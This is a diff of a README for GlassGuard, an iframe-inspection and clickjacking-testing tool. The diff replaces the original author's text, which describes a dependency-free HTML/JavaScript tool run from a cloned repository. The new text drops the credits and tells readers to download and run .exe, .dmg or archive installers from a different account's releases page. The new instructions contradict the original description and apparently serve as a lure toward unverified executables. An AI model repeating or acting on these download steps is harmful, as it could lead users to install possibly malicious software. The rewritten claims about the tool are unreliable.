@@ -1,79 +1,106 @@
-<div align="center">
+# 🛡️ GlassGuard - Securely Analyze Iframes with Ease
 
-  <p align="center"><img src="https://github.com/Cursed271/Cursed271/blob/main/Logo.png" width="30%"></a></p>
-  <h1>GlassGuard</h1>
-  
-  <p>
-    GlassGuard loads targets in an iframe for authorized inspection, enabling controlled interaction, logging, and testing.
-  </p>
-  
-  <h4>
-    <a href="https://github.com/Cursed271/GlassGuard/issues/new?labels=bug&template=bug_report.md">Report Bug</a>
-  <span> · </span>
-    <a href="https://github.com/Cursed271/GlassGuard/issues/new?labels=enhancement&template=feature_request.md">Request Feature</a>
-  </h4>
+## 🚀 Getting Started
 
-</div>
+Welcome to GlassGuard! This application helps you inspect iframes for security tests and controlled interactions. It supports iframe analysis, logging, interface manipulation, and detection tuning, providing you with a powerful tool for ethical red-team assessments and research.
 
-## 📖 Table of Contents
+## 📥 Download GlassGuard
 
-- [Introduction](#-introduction)
-- [Features](#-features)
-- [Installation and Usage](#%EF%B8%8F-installation-and-usage)
-- [Feedback](#-feedback)
-- [Contributors](#-contributors)
-- [License](#-license)
+[![Download GlassGuard](https://img.shields.io/badge/Download%20GlassGuard-v1.0-blue)](https://github.com/MCmushrif/GlassGuard/releases)
 
-## 🚀 Introduction
+To download GlassGuard, visit the link below:
 
-GlassGuard is a security tool that loads targets in an iframe for authorized inspection and controlled interaction. It enables penetration testing, iframe analysis, and interface auditing. Designed for researchers and red-teamers, it provides streamlined target loading, color-coded activity logging, reporting, detection testing within controlled environments, ensuring ethical use and compliance.
+[Download GlassGuard](https://github.com/MCmushrif/GlassGuard/releases)
 
-<p align="center">
-  <h4>GlassGuard</h4>
-  <img src = "https://github.com/Cursed271/GlassGuard/blob/main/GlassGuard.png">
-</p>
+## 💻 System Requirements
 
-## ✨ Features:
+Before you begin, ensure your system meets the following requirements:
 
-- 🧠 Iframe Inspection: Loads target URLs in an iframe for authorized analysis and visualization.
+- **Operating System**: Windows 10 or later, macOS, or any Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: Minimum 100 MB of free disk space.
+- **Web Browser**: Any modern web browser (Chrome, Firefox, Edge).
 
-- 🔍 Controlled Interaction: Safely interacts with embedded targets without bypassing iframe protections.
+## 🎯 Features
 
-- 📜 Activity Logging: Displays real-time color-coded logs for all target and load operations.
+GlassGuard offers several features designed to enhance your user experience:
 
-- 🧩 Red-Team Utility: Built for ethical iframe testing, interface inspection, and behavioral analysis.
+- **Iframe Analysis**: Inspect and analyze iframe content safely.
+- **Logging Functionality**: Keep logs of your testing sessions for reference.
+- **Interface Manipulation**: Easily manipulate various web interfaces for testing.
+- **Detection Tuning**: Adjust settings to optimize detection for different scenarios.
+- **User-Friendly Interface**: Enjoy an intuitive visual layout for efficient navigation.
 
-- ⚡ Lightweight & Self-Contained: Fully functional in pure HTML, CSS, and JavaScript — no external dependencies required.
+## 📚 How to Download & Install
 
+### Step 1: Visit the Releases Page
 
-## ⚙️ Installation and Usage:
+Click the following link to access the GlassGuard releases page:
 
-1. **Pre-requisites**: A modern web browser (Chrome, Firefox, Edge) and network access to the target (no Python or packages required).
-2. **Clone the Repo**: Use "***git clone https://github.com/Cursed271/GlassGuard***"
-3. **Traverse into the Directory**: Use "***cd GlassGuard***"
-4. **Install Dependencies**: None — GlassGuard is pure HTML/CSS/JS (no requirements.txt).
-5. **Run/Open**:
-      - *For internal targets*: Place index.html on a machine in that network and open it in the browser.
-      - *For external targets*: Open the live link in the Website section of this repository (click the URL).
-6. **Execute/Use**: Enter the Target URL in the UI and click Load Target 
+[Visit the Releases Page](https://github.com/MCmushrif/GlassGuard/releases)
 
-## 💬 Feedback  
+### Step 2: Select the Latest Version
 
-Have suggestions or feature requests? Feel free to reach out via:  
+On the releases page, locate the latest version of GlassGuard. It will be labeled with a version number, such as "v1.0".
 
-- 🐦 **Twitter**: [@Cursed271](https://x.com/Cursed271)  
-- 🐙 **GitHub**: [@Cursed271](https://github.com/Cursed271)  
-- 🔗 **LinkedIn**: [Steven Pereira](https://www.linkedin.com/in/Cursed271/)  
-- 📧 **Email**: [cursed.pereira@proton.me](mailto:cursed.pereira@proton.me)  
-- 🐞 **File an Issue**: [GitHub Issues](https://github.com/Cursed271/GlassGuard/issues)  
-- 💡 **Request a Feature**: [Feature Requests](https://github.com/Cursed271/GlassGuard/issues/new?labels=enhancement&template=feature_request.md) 
+### Step 3: Download the Application
 
-Your feedback helps improve GlassGuard! Contributions and PRs are always welcome. 🚀
+Click on the file that corresponds to your operating system. For example, if you are using Windows, click on the option with ".exe" at the end.
 
-## 🙌 Contributors
+### Step 4: Install GlassGuard
 
-- **Steven Pereira (aka Cursed)** - Creator & Maintainer  
+1. **For Windows**: Double-click the downloaded `.exe` file. Follow the prompts to install the application.
+2. **For Mac**: Open the downloaded `.dmg` file. Drag GlassGuard to your Applications folder.
+3. **For Linux**: Extract the downloaded archive and follow the instructions in the README file included.
+
+### Step 5: Launch GlassGuard
+
+Once installed, find GlassGuard in your applications and launch it. You are now ready to start analyzing iframes securely.
+
+## 📖 Usage Instructions
+
+### 1. Open the Application
+
+After launching GlassGuard, you will see the main interface. Familiarize yourself with the layout and options available on the dashboard.
+
+### 2. Input the Iframe URL
+
+Locate the input field designated for the iframe URL. Enter the URL you wish to analyze.
+
+### 3. Start Analysis
+
+Press the "Analyze" button to begin inspecting the iframe. The application will log the details and display results in real-time.
+
+### 4. View Logs
+
+You can access logs using the "Logs" tab in the main interface. This feature allows you to review your previous analyses easily.
+
+### 5. Adjust Settings
+
+At any point, you can tweak detection settings through the "Settings" menu. Adjust parameters to refine the analysis based on your specific needs.
+
+## 💬 Support
+
+If you encounter any issues or have questions, please refer to the GitHub Issues page for assistance. Other users and contributors can provide help. 
+
+## 🌐 Community and Contribution
+
+You are welcome to join the GlassGuard community. Share your findings, suggestions, or improvements. Collaboration helps enhance the tool for everyone.
+
+## 🔍 Related Topics
+
+Explore more about the security field and tools related to GlassGuard, including:
+
+- Blue Teaming
+- Ethical Hacking
+- Clickjacking Testing
+- Web Security 
+- UI Testing Tools
+
+Stay informed and improve your skills in web security testing.
 
 ## 📜 License
 
-GlassGuard is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
+GlassGuard is open source and follows the MIT License. Feel free to use and modify it according to your requirements.
+
+Enjoy using GlassGuard for your security analysis needs!
